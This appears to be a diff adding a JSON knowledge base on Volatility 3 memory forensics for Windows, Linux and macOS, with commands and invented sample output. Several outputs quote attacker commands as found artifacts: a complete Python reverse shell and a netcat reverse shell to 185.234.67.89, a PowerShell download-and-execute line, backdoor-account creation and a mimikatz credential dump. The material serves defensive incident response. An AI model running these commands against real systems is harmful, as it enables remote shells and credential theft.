@@ -1,0 +1,335 @@
+{
+  "knowledge_base_part": 4,
+  "categories": [
+    {
+      "id": "advanced_techniques",
+      "name": "Advanced Techniques",
+      "topics": [
+        {
+          "title": "Timeline Analysis with timeliner",
+          "keywords": ["timeliner", "timeline", "timeline analysis", "temporal analysis", "forensic timeline", "chronological analysis"],
+          "difficulty": "advanced",
+          "content": "Timeline analysis correlates events across multiple data sources to reconstruct the sequence of attacker activity. The timeliner plugin in Volatility 3 extracts timestamped events from various sources: process creation/exit times, network connection times, file access times, registry key modifications, and more. The output is typically formatted for import into timeline analysis tools like log2timeline/plaso, Timeline Explorer, or custom analysis. Key benefits: establishing attack timeline, correlating seemingly unrelated events, identifying initial compromise time, and understanding attack progression. Analysis approach: identify earliest malicious artifact, work backward to find initial access, work forward to map full impact. Timestamps in memory are point-in-time captures - they show state at dump time plus historical timestamps for events. Correlate with filesystem MFT, event logs, and network logs for comprehensive timeline. Look for clustering of suspicious events - attackers often perform multiple actions in short windows.",
+          "examples": [
+            {
+              "command": "vol -f memory.dmp timeliner.Timeliner",
+              "explanation": "Generate comprehensive timeline from all available timestamp sources in memory",
+              "use_case": "Building attack timeline for incident response",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               PDB scanning finished\n\n2024-01-15 08:23:11.000000|[PROCESS]|System (PID: 4) Created\n2024-01-15 08:23:14.000000|[PROCESS]|csrss.exe (PID: 348) Created\n2024-01-15 08:23:15.000000|[PROCESS]|services.exe (PID: 492) Created\n2024-01-15 08:23:15.000000|[PROCESS]|lsass.exe (PID: 500) Created\n2024-01-15 08:25:02.000000|[PROCESS]|explorer.exe (PID: 2156) Created\n2024-01-15 08:32:15.000000|[PROCESS]|chrome.exe (PID: 3472) Created\n2024-01-15 08:32:20.000000|[NETWORK]|chrome.exe -> 52.84.143.28:443 ESTABLISHED\n2024-01-15 09:30:00.000000|[PROCESS]|attachment.exe (PID: 5123) Created\n2024-01-15 09:30:05.000000|[NETWORK]|attachment.exe -> 185.234.67.89:443 ESTABLISHED\n2024-01-15 09:45:12.000000|[PROCESS]|cmd.exe (PID: 4128) Created\n2024-01-15 09:45:18.000000|[PROCESS]|powershell.exe (PID: 4256) Created\n2024-01-15 09:45:22.000000|[NETWORK]|powershell.exe -> 185.234.67.89:4444 ESTABLISHED\n2024-01-15 09:45:30.000000|[REGISTRY]|Run key modified\n2024-01-15 09:50:00.000000|[REGISTRY]|Services\\MaliciousService created\n2024-01-15 10:12:34.000000|[PROCESS]|malware.exe (PID: 6672) Created\n2024-01-15 10:12:35.000000|[NETWORK]|malware.exe -> 185.234.67.89:8080 ESTABLISHED\n\n[TIMELINE ANALYSIS:\n- 09:30:00 - Initial compromise: attachment.exe downloaded and executed\n- 09:30:05 - First C2 connection established\n- 09:45:12-18 - Attacker gained command shell (cmd -> powershell)\n- 09:45:22 - Secondary C2 on port 4444 (likely Meterpreter)\n- 09:45:30-50 - Persistence mechanisms installed\n- 10:12:34 - Additional malware deployed]"
+            },
+            {
+              "command": "vol -f memory.dmp timeliner.Timeliner --create-bodyfile",
+              "explanation": "Output timeline in bodyfile format for import into timeline tools",
+              "use_case": "Exporting for analysis in log2timeline, Timeline Explorer, or Autopsy",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               PDB scanning finished\n\n0|[Process] System (4)|0|0|0|0|0|1705308191|1705308191|1705308191|1705308191\n0|[Process] smss.exe (260)|0|0|0|0|0|1705308191|1705308191|1705308191|1705308191\n0|[Process] csrss.exe (348)|0|0|0|0|0|1705308194|1705308194|1705308194|1705308194\n0|[Network] chrome.exe -> 52.84.143.28:443|0|0|0|0|0|1705308740|0|0|0\n0|[Network] powershell.exe -> 185.234.67.89:4444|0|0|0|0|0|1705313122|0|0|0"
+            }
+          ],
+          "warnings": [
+            "Timeline accuracy depends on system clock - check for clock skew",
+            "Memory captures point-in-time state - some historical events may be overwritten",
+            "Coordinate with filesystem and log analysis for complete timeline",
+            "Attackers may manipulate timestamps (timestomping)"
+          ],
+          "best_practices": [
+            "Sort timeline chronologically to understand attack progression",
+            "Look for clustering of suspicious events in short time windows",
+            "Identify earliest malicious event to determine initial access time",
+            "Correlate memory timeline with filesystem MFT and event logs",
+            "Export to timeline analysis tools for visualization",
+            "Document timeline in incident report with key events highlighted"
+          ],
+          "related_cves": [],
+          "related_topics": ["Process Analysis", "Network Analysis", "Registry Analysis"]
+        },
+        {
+          "title": "String Analysis in Memory",
+          "keywords": ["strings", "memory strings", "artifact discovery", "string search", "grep memory", "pattern matching"],
+          "difficulty": "intermediate",
+          "content": "String analysis extracts readable text from memory to find artifacts, commands, URLs, credentials, and other evidence. While Volatility provides structured analysis, raw string searching catches artifacts that structured plugins miss. The strings plugin in Volatility associates discovered strings with their memory locations and owning processes. Key targets: URLs and IP addresses, file paths, command lines, credentials (passwords, API keys), malware configuration, encryption keys, and attacker commands. Combine with standard 'strings' command-line tool for comprehensive extraction, then grep for specific patterns. For process-specific strings, dump process memory first then run strings. Regular expressions enhance searching: IP patterns, URL patterns, base64 patterns, etc. Unicode strings (wide strings) are common in Windows - use both ASCII and Unicode extraction. Large memory dumps generate millions of strings - targeted searching is essential.",
+          "examples": [
+            {
+              "command": "vol -f memory.dmp windows.strings.Strings --pid 4256",
+              "explanation": "Extract strings from specific process memory with process association",
+              "use_case": "Finding artifacts within a suspicious process",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               PDB scanning finished\n\nPhysical Address        Process String\n\n0x1a2340        4256 (powershell.exe)   http://185.234.67.89/payload.ps1\n0x1a2400        4256 (powershell.exe)   IEX (New-Object Net.WebClient).DownloadString\n0x1a2500        4256 (powershell.exe)   -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...\n0x1a2600        4256 (powershell.exe)   whoami /all\n0x1a2700        4256 (powershell.exe)   net user backdoor P@ssw0rd123 /add\n0x1a2800        4256 (powershell.exe)   net localgroup administrators backdoor /add\n0x1a2900        4256 (powershell.exe)   sekurlsa::logonpasswords\n0x1a2a00        4256 (powershell.exe)   C:\\Users\\user\\Desktop\\credentials.txt\n0x1a2b00        4256 (powershell.exe)   MALWARE_MUTEX_12345\n\n[KEY FINDINGS:\n- Payload download URL discovered\n- Encoded PowerShell command present\n- Attacker commands: whoami, net user (backdoor creation!)\n- Mimikatz command executed (credential theft)\n- Malware mutex name identified]"
+            },
+            {
+              "command": "vol -f memory.dmp windows.memmap.Memmap --pid 4256 --dump && strings pid.4256.dmp | grep -iE 'password|admin|secret|key'",
+              "explanation": "Dump process memory and grep for sensitive strings",
+              "use_case": "Finding credentials and secrets in process memory",
+              "output_sample": "password=Super$ecretP@ss123\nadmin_api_key=sk_live_1234567890abcdef\nAWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\npassword: hacktheplanet\nAdministrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+            },
+            {
+              "command": "strings -a -el memory.dmp | grep -E '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'",
+              "explanation": "Extract all strings and grep for IP addresses using Unicode little-endian",
+              "use_case": "Finding all IP addresses mentioned in memory",
+              "output_sample": "192.168.1.100\n185.234.67.89\n10.0.0.50\n52.84.143.28\n142.250.189.206\n127.0.0.1\n0.0.0.0"
+            }
+          ],
+          "warnings": [
+            "String analysis produces large volumes of data - use targeted searches",
+            "False positives common - strings may be fragments or coincidental patterns",
+            "Credentials in memory may be historical, not currently valid",
+            "Attackers may obfuscate/encode strings to evade detection"
+          ],
+          "best_practices": [
+            "Focus searches with specific patterns: URLs, IPs, credentials, commands",
+            "Use both ASCII (-a) and Unicode (-el) string extraction",
+            "Correlate discovered strings with process context",
+            "Look for base64-encoded data - decode for additional artifacts",
+            "Document all discovered credentials for password reset",
+            "Extract C2 URLs and IPs for blocking and threat intelligence"
+          ],
+          "related_cves": [],
+          "related_topics": ["Process Memory", "YARA Scanning", "Artifact Recovery"]
+        },
+        {
+          "title": "Memory Carving and Raw Analysis",
+          "keywords": ["memory carving", "raw memory", "file carving", "data carving", "artifact carving", "forensic carving"],
+          "difficulty": "advanced",
+          "content": "Memory carving extracts embedded files and data structures from raw memory without relying on filesystem metadata. Techniques include: file header/footer carving (finding MZ for PE files, PK for ZIP), structure carving (finding specific data structures by signature), and pattern-based carving (finding data matching known formats). Tools: foremost, scalpel, binwalk can carve memory dumps directly. Key targets: embedded executables (malware dropped in memory), documents, images, encryption keys, and network packets. Carving is valuable when: structured plugins fail, you need to recover specific file types, or you're searching for artifacts outside process memory. Process: identify target format signatures, scan raw memory for matches, extract and analyze candidates. Memory is less structured than disk - expect more false positives. Combine with Volatility analysis to focus carving on specific memory regions.",
+          "examples": [
+            {
+              "command": "foremost -t exe,dll,doc,pdf -i memory.dmp -o carved_files/",
+              "explanation": "Carve executable files, DLLs, documents from memory dump",
+              "use_case": "Recovering embedded malware and documents from memory",
+              "output_sample": "Processing: memory.dmp\n|**************|\nforemost: /carved_files\n\nFoundry of 47 files:\nexe:    12\ndll:    23\ndoc:    8\npdf:    4\n\nCompleted in 2 minutes 34 seconds"
+            },
+            {
+              "command": "binwalk -e memory.dmp",
+              "explanation": "Binwalk extraction of embedded files and compressed data",
+              "use_case": "Finding and extracting embedded archives and compressed data",
+              "output_sample": "DECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n1048576       0x100000        Microsoft executable, portable (PE)\n2097152       0x200000        Zip archive data, at least v2.0 to extract\n3145728       0x300000        PNG image, 1920 x 1080, 8-bit/color RGBA\n4194304       0x400000        gzip compressed data, from Unix\n5242880       0x500000        Microsoft executable, portable (PE)\n6291456       0x600000        PDF document, version 1.7"
+            },
+            {
+              "command": "vol -f memory.dmp windows.memmap.Memmap --pid 6672 --dump && foremost -i pid.6672.dmp -o carved_malware/",
+              "explanation": "Dump malicious process memory and carve for embedded files",
+              "use_case": "Extracting payloads and tools embedded in malware process",
+              "output_sample": "Dumping process 6672 memory...\nOutput: pid.6672.dmp (45 MB)\n\nProcessing: pid.6672.dmp\nCarved files:\n- 00000123.exe (Meterpreter payload)\n- 00000456.dll (Mimikatz DLL)\n- 00000789.exe (PsExec copy)"
+            }
+          ],
+          "warnings": [
+            "Memory carving produces many false positives - validate all carved files",
+            "Carved files may be incomplete (memory paging, fragmentation)",
+            "Some file formats cannot be carved reliably from memory",
+            "Large memory dumps require significant processing time"
+          ],
+          "best_practices": [
+            "Target specific file types rather than carving all formats",
+            "Hash all carved files and check against VirusTotal",
+            "Validate carved executables before execution/analysis",
+            "Focus carving on process memory regions for better results",
+            "Combine carving with structured Volatility analysis",
+            "Document carved artifacts with offsets for reproducibility"
+          ],
+          "related_cves": [],
+          "related_topics": ["DumpFiles", "String Analysis", "Malware Recovery"]
+        }
+      ]
+    },
+    {
+      "id": "linux_forensics",
+      "name": "Linux Memory Forensics",
+      "topics": [
+        {
+          "title": "Linux Process Analysis",
+          "keywords": ["linux pslist", "linux.pslist", "linux.pstree", "linux.psscan", "linux process", "task_struct"],
+          "difficulty": "intermediate",
+          "content": "Linux memory forensics in Volatility 3 uses the linux.* plugin namespace. Linux process analysis examines task_struct structures in kernel memory. Key plugins: linux.pslist.PsList (walks task list), linux.pstree.PsTree (hierarchical view), linux.psaux.PsAux (ps aux equivalent with command lines). Unlike Windows, Linux process hiding requires different techniques - look for kernel module-based hiding, LD_PRELOAD hooks, and process namespace manipulation. Linux-specific indicators: processes running as root that shouldn't be, unusual init-spawned processes, processes with suspicious command lines, hidden processes via rootkit, and container/namespace escape attempts. Memory acquisition on Linux typically uses LiME (Linux Memory Extractor), and symbol generation requires the exact kernel version with debug symbols (dwarf2json). Cross-reference process analysis with network connections (linux.sockstat) and file descriptors.",
+          "examples": [
+            {
+              "command": "vol -f linux.mem linux.pslist.PsList",
+              "explanation": "List all processes from Linux memory dump",
+              "use_case": "Initial process enumeration on compromised Linux server",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               Linux symbol scanning finished\n\nOFFSET (V)      PID     TID     PPID    COMM\n\n0xffff888012340000      1       1       0       systemd\n0xffff888012345000      2       2       0       kthreadd\n0xffff88801234a000      156     156     1       systemd-journal\n0xffff88801234f000      178     178     1       systemd-udevd\n0xffff888012354000      245     245     1       rsyslogd\n0xffff888012359000      267     267     1       sshd\n0xffff88801235e000      289     289     1       cron\n0xffff888012363000      312     312     1       apache2\n0xffff888012368000      1456    1456    267     sshd\n0xffff88801236d000      1458    1458    1456    bash\n0xffff888012372000      1502    1502    1458    python\n0xffff888012377000      1534    1534    1502    /tmp/.hidden/malware\n0xffff88801237c000      1545    1545    1534    nc\n\n[ANALYSIS:\n- PID 1534: malware running from /tmp/.hidden/ - SUSPICIOUS\n- PID 1545: netcat spawned by malware - likely reverse shell\n- Attack chain: sshd -> bash -> python -> malware -> nc]"
+            },
+            {
+              "command": "vol -f linux.mem linux.psaux.PsAux",
+              "explanation": "Show processes with full command lines (like ps aux)",
+              "use_case": "Viewing complete command line arguments for process analysis",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               Linux symbol scanning finished\n\nPID     UID     GID     COMM    ARGS\n\n1       0       0       systemd /sbin/init\n156     0       0       systemd-journal /lib/systemd/systemd-journald\n267     0       0       sshd    /usr/sbin/sshd -D\n312     0       0       apache2 /usr/sbin/apache2 -k start\n1456    0       0       sshd    sshd: root@pts/0\n1458    0       0       bash    -bash\n1502    0       0       python  python -c 'import socket,subprocess,os;s=socket.socket(...)\n1534    0       0       malware /tmp/.hidden/malware -c2 http://185.234.67.89:8080\n1545    0       0       nc      nc -e /bin/bash 185.234.67.89 4444\n\n[CRITICAL FINDINGS:\n- PID 1502: Python reverse shell one-liner\n- PID 1534: Malware with C2 server specified\n- PID 1545: Netcat reverse shell to 185.234.67.89:4444]"
+            },
+            {
+              "command": "vol -f linux.mem linux.pstree.PsTree",
+              "explanation": "Show process tree for Linux to understand parent-child relationships",
+              "use_case": "Tracing attack chain through process hierarchy",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               Linux symbol scanning finished\n\nPID     PPID    COMM\n\n1       0       systemd\n├── 156 1       systemd-journal\n├── 178 1       systemd-udevd\n├── 245 1       rsyslogd\n├── 267 1       sshd\n│   └── 1456    267     sshd\n│       └── 1458        1456    bash\n│           └── 1502    1458    python\n│               └── 1534        1502    malware\n│                   └── 1545    1534    nc\n├── 289 1       cron\n└── 312 1       apache2"
+            }
+          ],
+          "warnings": [
+            "Linux symbols must match exact kernel version - use dwarf2json",
+            "Different Linux distributions have varying process structures",
+            "Container environments may show complex process hierarchies",
+            "Some rootkits hide from process listing - use multiple detection methods"
+          ],
+          "best_practices": [
+            "Use linux.psaux to see full command lines - critical for attack understanding",
+            "Look for processes in /tmp, /dev/shm, or hidden directories",
+            "Check for python/perl/bash one-liner commands (common attack tools)",
+            "Cross-reference with linux.sockstat for network connections",
+            "Compare against known-good process baseline for the server role",
+            "Look for processes running as root that shouldn't be"
+          ],
+          "related_cves": [],
+          "related_topics": ["Linux Network Analysis", "Linux Rootkit Detection"]
+        },
+        {
+          "title": "Linux Network Analysis",
+          "keywords": ["linux.sockstat", "linux network", "linux sockets", "linux connections", "netstat linux"],
+          "difficulty": "intermediate",
+          "content": "Linux network forensics uses linux.sockstat to enumerate network connections from memory. The plugin reads socket structures from kernel memory, providing information similar to 'netstat' but from the memory dump. Output includes: protocol (TCP/UDP), local address and port, remote address and port, socket state, and owning process. Unlike Windows netscan, Linux socket analysis may show Unix domain sockets and raw sockets in addition to TCP/UDP. Key indicators: connections to external IPs from non-network processes, reverse shells (high port to external IP), connections on unusual ports, and sockets owned by suspicious processes. Linux servers often have legitimate network services - compare against expected services for the server role. Look for connections from web shells (apache/nginx child processes with external connections), SSH tunnels, and data exfiltration channels.",
+          "examples": [
+            {
+              "command": "vol -f linux.mem linux.sockstat.Sockstat",
+              "explanation": "Enumerate all network sockets from Linux memory",
+              "use_case": "Finding network connections and potential C2 communications",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               Linux symbol scanning finished\n\nNetns   Proto   Source Address  Source Port     Destination Address     Destination Port        State   Inode   PID\n\n0       TCP     0.0.0.0 22      0.0.0.0 0       LISTEN  12345   267\n0       TCP     0.0.0.0 80      0.0.0.0 0       LISTEN  12346   312\n0       TCP     0.0.0.0 443     0.0.0.0 0       LISTEN  12347   312\n0       TCP     192.168.1.50    22      192.168.1.100   54321   ESTABLISHED     12348   1456\n0       TCP     192.168.1.50    45678   185.234.67.89   4444    ESTABLISHED     12349   1545\n0       TCP     192.168.1.50    45679   185.234.67.89   8080    ESTABLISHED     12350   1534\n0       UDP     0.0.0.0 123     0.0.0.0 0       -       12351   245\n\n[ANALYSIS:\n- Port 22, 80, 443 LISTEN - expected services\n- SSH from 192.168.1.100 - legitimate admin access?\n- Port 4444 to 185.234.67.89 - PID 1545 (nc) - REVERSE SHELL!\n- Port 8080 to 185.234.67.89 - PID 1534 (malware) - C2 CONNECTION!]"
+            },
+            {
+              "command": "vol -f linux.mem linux.sockstat.Sockstat | grep ESTABLISHED",
+              "explanation": "Filter to show only established connections",
+              "use_case": "Focusing on active connections for C2 detection",
+              "output_sample": "0       TCP     192.168.1.50    22      192.168.1.100   54321   ESTABLISHED     12348   1456\n0       TCP     192.168.1.50    45678   185.234.67.89   4444    ESTABLISHED     12349   1545\n0       TCP     192.168.1.50    45679   185.234.67.89   8080    ESTABLISHED     12350   1534"
+            }
+          ],
+          "warnings": [
+            "Linux network namespaces may compartmentalize socket visibility",
+            "Container environments have separate network stacks per container",
+            "Some sockets may be Unix domain sockets (local IPC, not network)",
+            "Raw sockets may not show standard address information"
+          ],
+          "best_practices": [
+            "Cross-reference socket PID with process list to understand context",
+            "Look for connections to external IPs from non-service processes",
+            "Focus on ESTABLISHED connections for active C2 detection",
+            "Check for connections on common C2 ports (4444, 8080, 9999)",
+            "Compare listening ports against expected services",
+            "Document all external connections for threat intelligence"
+          ],
+          "related_cves": [],
+          "related_topics": ["Linux Process Analysis", "C2 Detection"]
+        },
+        {
+          "title": "Linux Rootkit Detection",
+          "keywords": ["linux rootkit", "linux.lsmod", "linux.check_syscall", "kernel modules", "LKM rootkit", "linux.hidden_modules"],
+          "difficulty": "advanced",
+          "content": "Linux kernel rootkits typically load as Loadable Kernel Modules (LKMs) that hook system calls, hide processes, and modify kernel behavior. Detection techniques: linux.lsmod (list loaded modules), linux.check_syscall (detect syscall table hooks), linux.hidden_modules (find hidden modules), and linux.keyboard_notifiers (keylogger detection). LKM rootkits hide by: unlinking from module list (compare lsmod vs module scan), hooking system calls (check_syscall detects), and using kallsyms manipulation. Common hooked syscalls: sys_read (hide network traffic), sys_getdents (hide files), sys_open (hide files), and sys_kill (protect processes). Also check: /proc manipulation, netfilter hooks, and function pointer hijacking. Modern rootkits may use eBPF for stealthy hooking. Cross-reference process visibility between multiple methods, similar to Windows DKOM detection.",
+          "examples": [
+            {
+              "command": "vol -f linux.mem linux.lsmod.Lsmod",
+              "explanation": "List loaded kernel modules from Linux memory",
+              "use_case": "Identifying suspicious kernel modules that may be rootkits",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               Linux symbol scanning finished\n\nAddress Size    Name\n\n0xffffffffc0000000      16384   nf_conntrack\n0xffffffffc0004000      8192    ip_tables\n0xffffffffc0006000      12288   x_tables\n0xffffffffc0009000      20480   ext4\n0xffffffffc000e000      8192    mbcache\n0xffffffffc0010000      45056   e1000\n0xffffffffc001b000      8192    psmouse\n0xffffffffc001d000      16384   suspicious_module\n0xffffffffc0021000      8192    rootkit\n\n[SUSPICIOUS MODULES:\n- suspicious_module at 0xffffffffc001d000 - investigate!\n- rootkit at 0xffffffffc0021000 - OBVIOUS MALICIOUS MODULE!\n\nCompare with expected modules for this kernel version.]"
+            },
+            {
+              "command": "vol -f linux.mem linux.check_syscall.Check_syscall",
+              "explanation": "Check system call table for hooks indicating rootkit activity",
+              "use_case": "Detecting syscall table modifications by rootkits",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               Linux symbol scanning finished\n\nTable Name      Index   Address Expected        Actual  Hooked\n\nsys_call_table  0       0xffffffff81234567      0xffffffff81234567      False\nsys_call_table  1       0xffffffff81234600      0xffffffff81234600      False\nsys_call_table  78      0xffffffff81235000      0xffffffffc0021234      True    <- HOOKED!\nsys_call_table  79      0xffffffff81235100      0xffffffffc0021345      True    <- HOOKED!\nsys_call_table  217     0xffffffff81236000      0xffffffffc0021456      True    <- HOOKED!\n\n[CRITICAL: Syscall hooks detected!\n- Syscall 78 (sys_getdents) - Used to hide files/directories!\n- Syscall 79 (sys_getdents64) - Used to hide files/directories!\n- Syscall 217 (sys_getdents) - Additional hiding hook!\n\nHooks point to module at 0xffffffffc0021000 (rootkit)]"
+            },
+            {
+              "command": "vol -f linux.mem linux.hidden_modules.Hidden_modules",
+              "explanation": "Scan for kernel modules hidden from the module list",
+              "use_case": "Finding rootkit modules that unlinked themselves from lsmod",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               Linux symbol scanning finished\n\nAddress Size    Name\n\n0xffffffffc0025000      12288   hidden_rootkit\n0xffffffffc0028000      8192    stealth_mod\n\n[CRITICAL: Hidden kernel modules found!\n- hidden_rootkit: Not in lsmod, found via memory scan\n- stealth_mod: Not in lsmod, found via memory scan\n\nThese modules are hiding from normal enumeration!]"
+            }
+          ],
+          "warnings": [
+            "Kernel rootkit detection requires matching kernel symbols",
+            "Advanced rootkits may evade detection by modifying detection paths",
+            "Some legitimate security tools hook syscalls - verify before assuming malicious",
+            "Linux kernel variations affect detection accuracy"
+          ],
+          "best_practices": [
+            "Compare lsmod output with hidden_modules scan for discrepancies",
+            "Check_syscall is critical - hooked getdents hides files/processes",
+            "Look for modules with suspicious names or loaded from unusual paths",
+            "Cross-reference with known-good module list for the kernel version",
+            "Hooked syscalls indicate active rootkit - prioritize incident response",
+            "Document all suspicious modules with addresses for remediation"
+          ],
+          "related_cves": [],
+          "related_topics": ["Linux Process Analysis", "Kernel Analysis"]
+        }
+      ]
+    },
+    {
+      "id": "mac_forensics",
+      "name": "macOS Memory Forensics",
+      "topics": [
+        {
+          "title": "macOS Process Analysis",
+          "keywords": ["mac.pslist", "mac.pstree", "macOS process", "darwin", "XNU kernel", "mac forensics"],
+          "difficulty": "intermediate",
+          "content": "macOS (Darwin/XNU kernel) memory forensics uses the mac.* plugin namespace in Volatility 3. macOS process analysis examines proc structures in kernel memory, similar to Linux task_struct. Key plugins: mac.pslist.PsList (process enumeration), mac.pstree.PsTree (hierarchical view), and mac.psaux.PsAux (with command lines). macOS-specific considerations: System Integrity Protection (SIP) may limit rootkit activity, kernel extensions (kexts) are the macOS equivalent of LKMs, and modern macOS uses APFS with encryption. Suspicious indicators: processes spawned from /tmp or user directories, LaunchAgents/LaunchDaemons for persistence, unusual child processes of system processes, and processes with suspicious bundle identifiers. macOS Gatekeeper and notarization provide some protection, but attackers bypass with unsigned code or social engineering. Memory acquisition on macOS uses osxpmem or commercial tools.",
+          "examples": [
+            {
+              "command": "vol -f macos.mem mac.pslist.PsList",
+              "explanation": "List all processes from macOS memory dump",
+              "use_case": "Initial process enumeration on compromised Mac",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               macOS symbol scanning finished\n\nOFFSET (V)      PID     PPID    COMM    PATH\n\n0xffffff8012340000      0       0       kernel_task     /System/Library/Kernels/kernel\n0xffffff8012345000      1       0       launchd /sbin/launchd\n0xffffff801234a000      45      1       UserEventAgent  /usr/libexec/UserEventAgent\n0xffffff801234f000      67      1       fseventsd       /System/Library/Frameworks/.../fseventsd\n0xffffff8012354000      89      1       configd /usr/libexec/configd\n0xffffff8012359000      234     1       loginwindow     /System/Library/CoreServices/loginwindow.app/.../loginwindow\n0xffffff801235e000      456     234     Finder  /System/Library/CoreServices/Finder.app/Contents/MacOS/Finder\n0xffffff8012363000      789     1       Terminal        /Applications/Utilities/Terminal.app/Contents/MacOS/Terminal\n0xffffff8012368000      812     789     bash    /bin/bash\n0xffffff801236d000      834     812     python  /usr/bin/python\n0xffffff8012372000      856     834     malware /Users/user/.hidden/malware\n\n[ANALYSIS:\n- Normal macOS processes from launchd\n- Terminal -> bash -> python -> malware chain detected\n- Malware running from hidden directory in user home]"
+            },
+            {
+              "command": "vol -f macos.mem mac.psaux.PsAux",
+              "explanation": "Show macOS processes with full command lines",
+              "use_case": "Viewing complete arguments for attack analysis",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               macOS symbol scanning finished\n\nPID     UID     COMM    ARGS\n\n1       0       launchd /sbin/launchd\n234     501     loginwindow     /System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow console\n456     501     Finder  /System/Library/CoreServices/Finder.app/Contents/MacOS/Finder\n789     501     Terminal        /Applications/Utilities/Terminal.app/Contents/MacOS/Terminal\n812     501     bash    -bash\n834     501     python  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"185.234.67.89\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n856     501     malware /Users/user/.hidden/malware --beacon --c2 http://185.234.67.89:8080\n\n[CRITICAL FINDINGS:\n- PID 834: Python reverse shell to 185.234.67.89:4444\n- PID 856: Malware with C2 beacon configuration]"
+            }
+          ],
+          "warnings": [
+            "macOS symbols vary significantly between OS versions",
+            "System Integrity Protection limits some rootkit techniques",
+            "Modern Macs with Apple Silicon have different memory layouts",
+            "Memory acquisition on recent macOS requires specific techniques"
+          ],
+          "best_practices": [
+            "Check processes in /Users/*/Library and /tmp for malicious activity",
+            "Look for LaunchAgents/LaunchDaemons persistence mechanisms",
+            "Cross-reference with mac.lsmod for kernel extension analysis",
+            "Compare against known macOS process baseline",
+            "Check for processes with unusual bundle identifiers",
+            "Document attack chain through process parent relationships"
+          ],
+          "related_cves": [],
+          "related_topics": ["macOS Network Analysis", "macOS Persistence"]
+        },
+        {
+          "title": "macOS Network and Persistence Analysis",
+          "keywords": ["mac.netstat", "mac.lsmod", "macOS network", "LaunchAgent", "LaunchDaemon", "kext", "macOS persistence"],
+          "difficulty": "intermediate",
+          "content": "macOS network analysis uses mac.netstat (or similar plugins) to enumerate network connections from memory. Key differences from other platforms: macOS uses a unique implementation of the BSD socket API, kernel extensions (kexts) can intercept network traffic, and network extensions framework provides modern filtering. For persistence detection: LaunchAgents (/Library/LaunchAgents, ~/Library/LaunchAgents) run as user, LaunchDaemons (/Library/LaunchDaemons) run as root, Login Items, and kernel extensions. Use mac.lsmod to list loaded kernel extensions - malicious kexts are rare but powerful rootkits. Check for: unusual kexts not from Apple or known vendors, network connections from unexpected processes, persistence in LaunchAgent plists, and cron jobs. macOS Catalina and later restrict kext loading, making user-land persistence more common in modern attacks.",
+          "examples": [
+            {
+              "command": "vol -f macos.mem mac.lsmod.Lsmod",
+              "explanation": "List loaded kernel extensions on macOS",
+              "use_case": "Finding potentially malicious kernel extensions",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               macOS symbol scanning finished\n\nAddress Size    Name    Version Path\n\n0xffffff7f80000000      40960   com.apple.kec.corecrypto        1.0     /System/Library/Extensions/corecrypto.kext\n0xffffff7f80010000      20480   com.apple.iokit.IOACPIFamily    1.4     /System/Library/Extensions/IOACPIFamily.kext\n0xffffff7f80015000      102400  com.apple.driver.AppleACPIPlatform       6.1     /System/Library/Extensions/AppleACPIPlatform.kext\n0xffffff7f80030000      16384   com.apple.driver.AppleSMC       3.1.9   /System/Library/Extensions/AppleSMC.kext\n0xffffff7f80034000      8192    com.malicious.rootkit   1.0     /Library/Extensions/rootkit.kext\n\n[CRITICAL: Suspicious kernel extension detected!\n- com.malicious.rootkit in /Library/Extensions/\n- Not an Apple-signed extension\n- Located in user-writable /Library/Extensions (not /System/Library/Extensions)]"
+            },
+            {
+              "command": "vol -f macos.mem mac.netstat.Netstat",
+              "explanation": "Enumerate network connections from macOS memory",
+              "use_case": "Finding C2 connections and network activity",
+              "output_sample": "Volatility 3 Framework 2.5.0\nProgress:  100.00               macOS symbol scanning finished\n\nProto   Local Address   Local Port      Remote Address  Remote Port     State   PID     Process\n\nTCP     0.0.0.0 22      *       *       LISTEN  89      sshd\nTCP     0.0.0.0 80      *       *       LISTEN  123     httpd\nTCP     192.168.1.75    54321   185.234.67.89   4444    ESTABLISHED     834     python\nTCP     192.168.1.75    54322   185.234.67.89   8080    ESTABLISHED     856     malware\nUDP     0.0.0.0 5353    *       *       -       67      mDNSResponder\n\n[ANALYSIS:\n- PID 834 (python) - ESTABLISHED to 185.234.67.89:4444 - REVERSE SHELL\n- PID 856 (malware) - ESTABLISHED to 185.234.67.89:8080 - C2 CONNECTION]"
+            }
+          ],
+          "warnings": [
+            "macOS network analysis plugins may differ between Volatility versions",
+            "Kernel extension analysis requires correct macOS symbols",
+            "Modern macOS restricts kext loading significantly",
+            "Network Extensions framework may not be fully visible in memory"
+          ],
+          "best_practices": [
+            "Check for kexts in /Library/Extensions (user-installed, potentially malicious)",
+            "Verify kext signatures and compare against known macOS kexts",
+            "Cross-reference network connections with process analysis",
+            "Look for LaunchAgent/LaunchDaemon persistence in memory strings",
+            "Document all suspicious network connections for blocking",
+            "Check for cron jobs and login items for additional persistence"
+          ],
+          "related_cves": [],
+          "related_topics": ["macOS Process Analysis", "Persistence Detection"]
+        }
+      ]
+    }
+  ]
+}
